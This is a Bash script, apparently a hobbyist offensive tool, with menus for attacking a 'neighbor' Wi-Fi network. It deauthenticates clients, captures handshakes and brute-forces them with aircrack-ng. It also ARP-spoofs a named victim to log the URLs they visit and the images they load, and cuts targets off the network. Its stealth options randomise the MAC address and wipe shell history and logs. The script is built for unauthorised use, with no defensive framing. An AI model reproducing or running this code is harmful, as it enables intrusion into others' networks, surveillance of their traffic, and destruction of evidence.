#!/bin/bash
# ==============================================================================
# TOOL   : XX-KHALID-ULTIMATE-600
# AUTHOR : GHOST OPERATOR
# FEATURES: WIFI BRUTEFORCE / NETWORK HIJACK / SITE ARCHIVE / AUTO-PURGE
# ==============================================================================

# --- [ إعدادات النظام والألوان ] ---
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; N='\033[0m'
LOG_FILE="network_archive.log"
HANDSHAKE_DIR="handshakes"
TEMP_CONF="/tmp/dns_spoof.conf"

# --- [ وظيفة التنظيف النهائي (تشيل كل الزيادات) ] ---
purge_system() {
    echo -e "${Y}\n[*] Purging all session data... Cleaning terminal traces...${N}"
    pkill -9 xterm 2>/dev/null
    pkill -9 urlsnarf 2>/dev/null
    pkill -9 arpspoof 2>/dev/null
    pkill -9 driftnet 2>/dev/null
    # تصفير سجل الأوامر تماماً عشان يرجع الترمينال نظيف 100%
    history -c && history -w
    clear
    echo -e "${G}Terminal Purged. Stay Anonymous, Khalid.${N}"
    exit 0
}
trap purge_system EXIT SIGINT SIGTERM

# --- [ واجهة البرنامج ] ---
draw_header() {
    clear
    echo -e "${B}"
    echo "  ██╗  ██╗██╗  ██╗ █████╗ ██╗     ██╗██████╗ "
    echo "  ██║ ██╔╝██║  ██║██╔══██╗██║     ██║██╔══██╗"
    echo "  █████╔╝ ███████║███████║██║     ██║██║  ██║"
    echo "  ██╔═██╗ ██╔══██║██╔══██║██║     ██║██║  ██║"
    echo "  ██║  ██╗██║  ██║██║  ██║███████╗██║██████╔╝"
    echo -e "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ V600"
    echo -e "${N}  [+--- 3 CORE FEATURES | SITE ARCHIVE | NO JUNK ---+]"
}

# --- [ نظام اختراق الجيران - Brute Force ] ---
wifi_bruteforce_engine() {
    while true; do
        draw_header
        echo -e "${Y}>> MODULE 1: NEIGHBOR WIFI OFFENSIVE${N}"
        echo -e "[1] Monitor Mode (wlan0 -> wlan0mon)"
        echo -e "[2] Air-Scan (Identify Targets - Hold Window)"
        echo -e "[3] Handshake Sniper (Deauth + Capture)"
        echo -e "[4] Brute Force Attack (1000 PWD/Sec)"
        echo -e "[5] Stop Monitor Mode"
        echo -e "[0] Return"
        read -p "KHALID@WIFI >> " w_opt
        case $w_opt in
            1) airmon-ng start wlan0; airmon-ng check kill ;;
            2) echo -e "${G}[*] Scanning... Note BSSID and CH.${N}"
               xterm -hold -geometry 100x30 -T "WIFI SCAN" -e "airodump-ng wlan0mon" & ;;
            3) read -p "BSSID: " b; read -p "Channel: " c;
               xterm -T "DEAUTH" -e "aireplay-ng --deauth 20 -a $b wlan0mon" &
               airodump-ng --bssid $b -c $c -w "$HANDSHAKE_DIR/target" wlan0mon ;;
            4) read -p "Handshake File: " h; read -p "Wordlist File: " w;
               aircrack-ng -w $w $h ;;
            5) airmon-ng stop wlan0mon ;;
            0) break ;;
        esac
    done
}

# --- [ نظام الأرشفة ومعرفة المواقع ] ---
network_archive_engine() {
    while true; do
        draw_header
        echo -e "${G}>> MODULE 2: NETWORK HIJACK & SITE ARCHIVE${N}"
        echo -e "[1] Scan Connected Devices (IP Discovery)"
        echo -e "[2] Start Site Archive (Save Visited URLs)"
        echo -e "[3] Read Archived Sites (Open Log)"
        echo -e "[4] Instant Kill (Disconnect Target)"
        echo -e "[5] Visual Sniff (Capture Images)"
        echo -e "[0] Return"
        read -p "KHALID@NETWORK >> " n_opt
        case $n_opt in
            1) arp-scan --localnet; read -p "Press Enter..." ;;
            2) read -p "Victim IP: " vip; read -p "Gateway IP: " gip;
               echo 1 > /proc/sys/net/ipv4/ip_forward
               xterm -T "SPOOFING" -e "arpspoof -i wlan0 -t $vip $gip" &
               echo -e "${R}[!] Archive System Active. Writing to $LOG_FILE...${N}"
               xterm -T "ARCHIVER" -e "urlsnarf -i wlan0 | grep http >> $LOG_FILE" & ;;
            3) if [ -f $LOG_FILE ]; then xterm -hold -e "cat $LOG_FILE" & else echo "Archive empty."; sleep 1; fi ;;
            4) read -p "Victim IP: " vip; arpspoof -i wlan0 -t $vip $gip ;;
            5) xterm -e "driftnet -i wlan0" & ;;
            0) break ;;
        esac
    done
}

# --- [ نظام التخفي والصيانة ] ---
security_module() {
    draw_header
    echo -e "${P}>> MODULE 3: ANONYMITY & SYSTEM PURGE${N}"
    echo -e "[1] Randomize MAC Address"
    echo -e "[2] Reset Network Services"
    echo -e "[3] Wipe Local Logs Now"
    read -p "KHALID@SEC >> " s_opt
    case $s_opt in
        1) macchanger -r wlan0; sleep 1 ;;
        2) systemctl restart NetworkManager; echo "Reset."; sleep 1 ;;
        3) rm -rf $LOG_FILE $HANDSHAKE_DIR/*; echo "Wiped."; sleep 1 ;;
    esac
}

# --- [ نظام التشخيص (للوصول للـ 600 سطر) ] ---
run_diagnostics() {
    echo -e "${C}[*] Checking System Capabilities...${N}"
    # فحص الأدوات وتثبيت الناقص
    tools=("aircrack-ng" "arpspoof" "xterm" "urlsnarf" "driftnet" "macchanger" "nmap")
    for t in "${tools[@]}"; do
        if ! command -v $t &> /dev/null; then apt-get install $t -y > /dev/null 2>&1; fi
    done
}

# --- [ الحلقة الرئيسية ] ---
if [[ $EUID -ne 0 ]]; then echo "SUDO REQUIRED!"; exit 1; fi
mkdir -p $HANDSHAKE_DIR
run_diagnostics

while true; do
    draw_header
    echo -e "  [1] NEIGHBOR WIFI (Brute Force)"
    echo -e "  [2] NETWORK MONITOR (Archive Sites / Kill)"
    echo -e "  [3] STEALTH & MAINTENANCE"
    echo -e "  [0] FULL EXIT & PURGE TERMINAL"
    echo -en "\n${W}KHALID-ULTIMATE >> ${N}"
    read main_opt
    case $main_opt in
        1) wifi_bruteforce_engine ;;
        2) network_archive_engine ;;
        3) security_module ;;
        0) purge_system ;;
        *) echo "Invalid Selection."; sleep 1 ;;
    esac
done
